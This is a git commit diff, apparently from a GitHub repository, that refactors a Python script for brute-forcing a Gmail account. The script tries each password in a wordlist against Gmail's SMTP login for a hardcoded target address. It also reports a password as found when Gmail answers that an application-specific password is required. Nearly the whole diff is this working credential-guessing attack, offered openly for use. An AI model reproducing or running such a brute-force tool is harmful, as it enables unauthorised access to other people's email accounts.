e786bc0f859dae5f0fdc0f49688c010a194e379a
h0tak88r <108616378+M8SZT8@users.noreply.github.com>
2023-04-29 04:55:49 +0200

    Update gmail-h0tak88r.py

--- gmail-h0tak88r.py
+++ gmail-h0tak88r.py
@@ -1,67 +1,48 @@
 import smtplib
 
-RED,END =  '\033[1;91m','\033[0m'
+RED, END =  '\033[1;91m', '\033[0m'
 
 target = 'msztdeku88@gmail.com' #Target gmail address
 
-mail = smtplib.SMTP("smtp.gmail.com", 587)
-
-mail.ehlo()  
-
-mail.starttls() 
-
-password_count = 0    
-
-BANNER=("""
-
+BANNER = """
   _    __  _        _   ___  ___     
  | |_ /  \| |_ __ _| |_( _ )( _ )_ _ 
  | ' \ () |  _/ _` | / / _ \/ _ \ '_|
  |_||_\__/ \__\__,_|_\_\___/\___/_|  
                                      
-""")
+"""
 
-try : 
-    print(RED+BANNER+END)
+try:
+    print(RED + BANNER + END)
     print(RED + '[+] Brute force started' + END)
 
-    for password in open('passwords.txt','r',encoding='utf-8').readlines():
-        
-        try : 
-            
-            password_count += 1
-            
-            print( f'\rTried password number => {password_count}\r',end='')
-          
-            mail.login(target,password)
+    with smtplib.SMTP("smtp.gmail.com", 587) as mail:
+        mail.ehlo()  
+        mail.starttls() 
 
-            print('Password Found =>',password)
-            
-            print(RED+"🙌 THAT'S IT !,YOU'RE DONE "+END)
-            
-            break
-        
-        except  smtplib.SMTPAuthenticationError as error  : 
-            
-            two_factor =  'Application-specific password required.'
-            
-            if two_factor in str(error) :  
-                
-                print(RED + 'Password Found but need 2FA. ' + END)
-                
-                print( RED + 'Password =>',password + END )
-                
-                print(RED+"🙌 THAT'S IT !,YOU'RE DONE "+END)
+        password_count = 0
 
-                break 
-            
-            else :
+        with open('passwords.txt', 'r', encoding='utf-8') as password_file:
+            for password in password_file:
+                password_count += 1
                 
-                pass
+                print(f"\rTried password number => {password_count}\r", end='')
 
-        
-except FileNotFoundError : 
-    
-    print('Check your passw.txt file location and try again.')
+                try:
+                    mail.login(target, password.strip())
+                    print('Password Found =>', password)
+                    print(RED + "🙌 THAT'S IT!, YOU'RE DONE" + END)
+                    break
 
-mail.close()
+                except smtplib.SMTPAuthenticationError as error:
+                    two_factor = 'Application-specific password required.'
+                    if two_factor in str(error):
+                        print(RED + 'Password Found but need 2FA. ' + END)
+                        print(RED + f'Password => {password}' + END)
+                        print(RED + "🙌 THAT'S IT!, YOU'RE DONE" + END)
+                        break
+
+                    else:
+                        pass
+except FileNotFoundError:
+    print('Check your passwords.txt file location and try again.')
